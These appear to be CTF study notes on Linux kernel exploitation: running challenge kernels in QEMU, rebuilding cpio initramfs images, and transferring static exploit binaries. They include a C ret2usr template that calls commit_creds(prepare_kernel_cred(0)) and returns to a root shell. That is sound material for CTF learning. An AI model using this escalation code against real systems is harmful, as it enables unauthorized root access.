## Kernel
### Tricks
* https://github.com/Myldero/kernelinit/blob/master/tricks.md
### Running
* Usually provide a run script or command
* Example:
``` bash
#!/bin/sh

qemu-system-x86_64 -cpu qemu64,-smep,-smap \
        -m 64 \
        -kernel ./kernel \
        -nographic \
        -append "console=ttyS0 quiet" -initrd ./new_initramfs \
        -monitor /dev/null
 
```
* Check cpu protections
* Check monitor
	* Should never be enabled:
		* Can raw read all memory
* Run to make sure it works
	* Not working challenge right away, could mean dead challenge/author problem
	* Could mean you problem
* Check perms (authors mess up)
	* Check flag permission 
	* Check write access to sbin
	* Check write access to /
	* Check write access to bin
	* Check busybox setuid
### CPIO archives
* Can be gziped
* Extracting
	* cpio -idv < {cpio file}
* Building
	* find . | cpio -o -H newc > {new cpio archive}
* Take note of version version handling
	* gzip
	* SVR4 with no crc
	* etc
### Files
* Have a file directory now
* Pull challenge (if needed)
* Modify init, become root (locally)
	* Usually done with removal of `exec su user`
	* Modify anything else, locally
### Run script
* Disable protections, for testing, if needed/wanted
* Point to new cpio archive, allows the ability to reuse original if not overwritten
* kill/pkill if terminal hangs
* gdb
### C Code
* With new cpio we can add files
* exploit.c (or whatever)
* gcc compile with -static (usually needs to be static!!!!)
* Templates are useful, saving flags/registers (common)
* Example:
``` c
struct trap_frame{
    void *eip;
    uint32_t cs;
    uint32_t eflags;
    void *esp;
    uint32_t ss;
};

struct trap_frame tf;
void launch_shell(){
    execl("/bin/sh","sh",NULL);
}

void prepare_tf(){
    asm("pushl %cs;"
        "popl tf+4;" //set cs
        "pushfl;"
        "popl tf+8;" //set eflags;
        "pushl %esp;"
        "popl tf+12;" //set esp;
        "pushl %ss;"
        "popl tf+16;"); //set ss;
    tf.eip = &launch_shell;
    tf.esp -= 1024;
}

#define KERNCALL __attribute__((regparm(3)))
void (*commit_creds)(void *) KERNCALL = (void*)0xc10682e0;
void *(*prepare_kernel_cred)(void *) KERNCALL = (void *)0xc1068480;

void payload(void){
    commit_creds(prepare_kernel_cred(0));
    asm("mov $tf,%esp;"
        "iret;"
        );
}
```

### Build Script
  * Save time, create a build script
  * Example:
``` bash
cd output

gcc -static exploit.c

if [ $? != 0 ]
then
        exit
fi

find . | cpio -o -H newc > new_initramfs

mv new_initramfs ..

```

### Remote
* Get the file over now
* If network communication (unlikely), curl/wget/nc the binary onto the system
* * If gcc exists, use theirs
* Else... You need to copy and paste the binary
	* SCRIPT IT, better yet have the script done before hand!!!
* Usually limited to sending 1024 at a time, if that
* Static binaries are much larger than regular
* Smaller the binary easier to send.
	* gcc -s -static
		* Stripped
* Possibly use musl-gcc
	* May not have full functionality
* GZIP, BZIP, TAR
* Probably need to send over in base64 or hex

## Different Arch binaries
* Usually qemu-arch will work
	* Doesn't usually have ASLR
	* Doesn't usually have protections
		* CET
		* PAC
		* BTI
		* NX
* Doesn't usually handle threading
	* Need to use qemu-system
		* Usually not provided
		* Have yourself

### Qemu-system for userspace
* Can run binary, but what about scripts?
* Set up network connections
* Example:
  ``` bash
#run.sh
#!/bin/sh

ip link add br0 type bridge
ifconfig br0 up
ifconfig br0 10.10.0.1/24

qemu-system-x86_64 -cpu qemu64,-smep,-smap \
        -m 64 \
        -kernel ./kernel \
        -nographic \
        -append "console=ttyS0 quiet" -initrd ./new_initramfs \
        -monitor /dev/null
        -netdev bridge,id=br0 -device virtio-net,netdev=br0,mac=e6:c8:ff:09:76:99
```

```bash
#init
...
ifconfig eth0 up
ifconfig eth0 10.10.0.2
...
```

``` bash
#/etc/qemu/bridge.conf
allow br0
```

* gdb
* gdbserver
* nc/socat
* Socat for running on socket still `socat TCP-LISTEN:8080,fork EXEC:./mybinary,pty`